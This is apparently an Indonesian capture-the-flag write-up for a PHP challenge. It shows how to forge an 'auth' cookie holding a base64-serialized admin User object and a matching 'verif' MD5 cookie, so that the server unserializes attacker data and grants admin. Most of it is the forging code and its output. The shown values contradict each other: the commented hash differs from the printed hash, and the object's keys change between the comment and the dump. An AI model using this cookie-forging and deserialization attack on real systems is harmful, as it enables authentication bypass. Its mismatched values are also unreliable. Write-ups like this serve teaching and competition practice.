* Cookie auth merupakan serialize dari objek User dengan user-> admmin dan pass-> True + diencode ke base64. Adapun cookie verif merupakan hasil encode base64 dari md5 cookie auth. Jadi untuk mendaptkan admin, peserta harus membuat payload objek untuk diserialize yang benar (seperti di bawah) dan mengencodenya ke base64 sebagai cookie auth. Lalu menghash md5 
dari hasil cookie auth sebagai cookie check. 

  Lebih lengkap:
  ```
  <?php
  $_COOKIE['auth'] = 'Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtiOjE7fQ==';
  //O:4:"User":2:{s:8:"username";s:5:"admin";s:8:"password";b:1;} -> md5 -> 1aeb9a86182f5e268f7fdfae04d1e08f

  $_COOKIE['verif'] = 'MWFlYjlhODYxODJmNWUyNjhmN2ZkZmFlMDRkMWUwOGY=';
  //base64 1aeb9a86182f5e268f7fdfae04d1e08f

  var_dump(md5($_COOKIE['auth']));
  var_dump(base64_decode($_COOKIE['verif']));

  if(md5($_COOKIE['auth']) === base64_decode($_COOKIE['verif'])) {
      $login = unserialize(base64_decode($_COOKIE['auth']));
      var_dump($login);
  }else {

  }
  ```
  
  ```
  string(32) "6897f0060a84ecb0600e4167d2a748e4"
  string(32) "6897f0060a84ecb0600e4167d2a748e4"
  object(__PHP_Incomplete_Class)#1 (3) {
  ["__PHP_Incomplete_Class_Name"]=>
  string(4) "User"
  ["user"]=>
  string(5) "admin"
  ["pass"]=>
  bool(true)
  }
  ```
